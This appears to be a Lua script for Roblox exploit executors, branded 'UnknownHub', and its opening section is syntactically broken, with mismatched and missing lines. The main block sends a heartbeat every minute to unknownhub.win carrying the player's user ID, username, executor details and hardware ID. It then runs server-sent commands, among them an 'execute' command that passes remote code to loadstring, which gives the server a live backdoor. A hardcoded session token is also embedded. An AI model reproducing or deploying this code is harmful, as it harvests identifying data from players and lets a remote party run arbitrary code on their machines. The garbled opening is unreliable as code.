    local teleportQueueJobId = tostring(game.JobId or "")

    local function getQueueOnTeleport()
        if type(queue_on_teleport) == "function" then
            return queue_on_teleport

            end
        end

    end

    local function teleportQueueStore()

            if ok and type(env) == "table" then
                return env
            end
        end
        if type(_G) == "table" then
            return _G
        end
        return nil
    end

    local function teleportAlreadyQueued()
        local store = teleportQueueStore()
        if not store then
            return false
        end
        if type(store.__UnknownHubTeleportQueue) ~= "table" then
            store.__UnknownHubTeleportQueue = {}
        end
        return store.__UnknownHubTeleportQueue[teleportLoaderUrl] == teleportQueueJobId
    end

    local function markTeleportQueued()
        local store = teleportQueueStore()
        if not store then
            return

        if type(store.__UnknownHubTeleportQueue) ~= "table" then
            store.__UnknownHubTeleportQueue = {}

        store.__UnknownHubTeleportQueue[teleportLoaderUrl] = teleportQueueJobId

        if okQueued then

do
    local heartbeatUrl = "https://unknownhub.win/api/lua/script/heartbeat"
    local heartbeatOwnerKey = "bd48be0a9740c3f8112a71a9a6f8bbbd"
    local heartbeatSessionId = "b02e28ee-986b-46c9-ad1b-440df298edcc"
    local heartbeatToken = "eyJ0eXAiOiJ1bmtub3duaHViLWxpdmUtc2Vzc2lvbiIsInYiOjEsInNlc3Npb25JZCI6ImIwMmUyOGVlLTk4NmItNDZjOS1hZDFiLTQ0MGRmMjk4ZWRjYyIsIm93bmVyVXNlcklkIjoiNzcxNzA1MTMxMDYxNjA4NDU4IiwicHJvamVjdElkIjoiNTQ0NzRiNGM1ZDVhNGY0NTk5MDljNGNiNzBlN2I0ZjMiLCJzY3JpcHRJZCI6ImJkNDhiZTBhOTc0MGMzZjgxMTJhNzFhOWE2ZjhiYmJkIiwiaHdpZEhhc2giOiIyODAzNTkwZjhlNzUxMzcwOGUyNTE3N2IxNGM1NTI1ZTk3N2RlZTZlNzdjZWYwMzBhZmE2ZDMyNmQyMjcyYWQxIiwiZ2FtZUlkIjoiMTA3NDE2NTQyODIiLCJpYXQiOjE3OTA1MzEzNDEsImV4cCI6MTc5MDU3NDU0MSwibm9uY2UiOiIzMGY5MThmYy1lNjk0LTQxMzgtOGRjNi03N2VmMjg3ZTBjYTUifQ.b-eKOfwTm7EF5nVngKuV1SCAwfhrhMbcy1ivvBQ36j0"
    local heartbeatInterval = 60
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local StarterGui = game:GetService("StarterGui")
    local TeleportService = game:GetService("TeleportService")
    local LocalPlayer = Players.LocalPlayer
    local heartbeatState = { active = true }
    local heartbeatStore = nil

    if type(getgenv) == "function" then
        local ok, env = pcall(getgenv)
        if ok and type(env) == "table" then
            heartbeatStore = env
        end
    end
    if not heartbeatStore and type(_G) == "table" then
        heartbeatStore = _G
    end
    if heartbeatStore then
        local ok = pcall(function()
            if type(heartbeatStore.__UnknownHubLiveHeartbeats) ~= "table" then
                heartbeatStore.__UnknownHubLiveHeartbeats = {}
            end
            local previousState = heartbeatStore.__UnknownHubLiveHeartbeats[heartbeatOwnerKey]
            if type(previousState) == "table" then
                previousState.active = false
            end
            heartbeatStore.__UnknownHubLiveHeartbeats[heartbeatOwnerKey] = heartbeatState
        end)
        if not ok then
            heartbeatStore = nil
        end
    end

    local function heartbeatIsActive()
        if not heartbeatState.active then
            return false
        end
        if not heartbeatStore then
            return true
        end
        local ok, isCurrent = pcall(function()
            return heartbeatStore.__UnknownHubLiveHeartbeats[heartbeatOwnerKey] == heartbeatState
        end)
        return ok and isCurrent
    end

    local function stopHeartbeat()
        heartbeatState.active = false
        if heartbeatStore then
            pcall(function()
                if heartbeatStore.__UnknownHubLiveHeartbeats[heartbeatOwnerKey] == heartbeatState then
                    heartbeatStore.__UnknownHubLiveHeartbeats[heartbeatOwnerKey] = nil
                end
            end)
        end
    end

    local function safeString(value)
        if value == nil then
            return ""
        end
        return tostring(value)
    end

    local function safeCall(fn, ...)
        if type(fn) ~= "function" then
            return ""
        end
        local ok, result = pcall(fn, ...)
        if ok and result ~= nil then
            return safeString(result)
        end
        return ""
    end

    local function requestFunction()
        if type(request) == "function" then
            return request
        end
        if type(http_request) == "function" then
            return http_request
        end
        if type(syn) == "table" and type(syn.request) == "function" then
            return syn.request
        end
        if type(http) == "table" and type(http.request) == "function" then
            return http.request
        end
        if type(fluxus) == "table" and type(fluxus.request) == "function" then
            return fluxus.request
        end
        return nil
    end

    local function getExecutor()
        if type(identifyexecutor) == "function" then
            local ok, name, version = pcall(identifyexecutor)
            if ok then
                return safeString(name), safeString(version)
            end
        end
        if type(getexecutorname) == "function" then
            return safeCall(getexecutorname), ""
        end
        return "", ""
    end

    local function getHwid()
        local value = safeCall(get_hwid)
        if value ~= "" then
            return value
        end
        value = safeCall(gethwid)
        if value ~= "" then
            return value
        end
        value = safeCall(get_hardware_id)
        if value ~= "" then
            return value
        end
        local ok, analytics = pcall(function()
            return game:GetService("RbxAnalyticsService")
        end)
        if ok and analytics then
            return safeCall(function()
                return analytics:GetClientId()
            end)
        end
        return ""
    end

    local function showNotification(message)
        message = safeString(message)
        if message == "" then
            return
        end
        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "UnknownHub",
                Text = message,
                Duration = 8,
            })
        end)
        print("[UnknownHub] " .. message)
    end

    local function rejoinServer(message)
        showNotification(message ~= "" and message or "Rejoining...")
        if not LocalPlayer then
            return
        end
        pcall(function()
            if safeString(game.JobId) ~= "" then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
            else
                TeleportService:Teleport(game.PlaceId, LocalPlayer)
            end
        end)
    end

    local function handleCommand(command)
        if type(command) ~= "table" then
            return
        end

        local commandType = safeString(command.type):lower()
        local payload = command.payload
        if type(payload) ~= "table" then
            payload = {}
        end

        local message = safeString(payload.message)
        if commandType == "message" then
            showNotification(message)
        elseif commandType == "disconnect" then
            if LocalPlayer then
                LocalPlayer:Kick(message ~= "" and message or "Disconnected by UnknownHub admin.")
            end
        elseif commandType == "rejoin" then
            rejoinServer(message)
        elseif commandType == "execute" then
            local code = safeString(payload.code)
            if code == "" then
                return
            end
            if type(loadstring) ~= "function" then
                warn("[UnknownHub] Remote Code Execution unavailable: loadstring missing")
                return
            end
            local chunk, compileError = loadstring(code)
            if not chunk then
                warn("[UnknownHub] Remote Code Execution compile failed: " .. safeString(compileError))
                return
            end
            task.spawn(function()
                local ok, runtimeError = pcall(chunk)
                if not ok then
                    warn("[UnknownHub] Remote Code Execution failed: " .. safeString(runtimeError))
                end
            end)
        end
    end

    local function handleHeartbeatResponse(result)
        local responseBody = ""
        if type(result) == "table" then
            responseBody = safeString(result.Body or result.body or "")
        elseif type(result) == "string" then
            responseBody = result
        end

        if responseBody == "" then
            return
        end

        local ok, decoded = pcall(function()
            return HttpService:JSONDecode(responseBody)
        end)

        if not ok or type(decoded) ~= "table" or type(decoded.commands) ~= "table" then
            return
        end

        for _, command in ipairs(decoded.commands) do
            handleCommand(command)
        end
    end

    local function sendHeartbeat()
        local req = requestFunction()
        if type(req) ~= "function" then
            return
        end
        local executorName, executorVersion = getExecutor()
        local body = HttpService:JSONEncode({
            token = heartbeatToken,
            session_id = heartbeatSessionId,
            place_id = safeString(game.PlaceId),
            game_id = safeString(game.GameId),
            job_id = safeString(game.JobId),
            roblox_user_id = LocalPlayer and safeString(LocalPlayer.UserId) or "",
            roblox_username = LocalPlayer and safeString(LocalPlayer.Name) or "",
            executor_name = executorName,
            executor_version = executorVersion,
            hwid = getHwid(),
        })
        local ok, result = pcall(req, {
            Url = heartbeatUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["Accept"] = "application/json",
            },
            Body = body,
        })
        if ok then
            if not heartbeatIsActive() then
                return false
            end
            local statusCode = 0
            if type(result) == "table" then
                statusCode = tonumber(result.StatusCode or result.Status or result.status_code or result.status) or 0
            end
            if statusCode == 401 or statusCode == 403 then
                return false
            end
            handleHeartbeatResponse(result)
        end
        return true
    end

    task.spawn(function()
        task.wait(1)
        while heartbeatIsActive() do
            if not sendHeartbeat() then
                break
            end
            task.wait(heartbeatInterval)
        end
        stopHeartbeat()
    end)
end
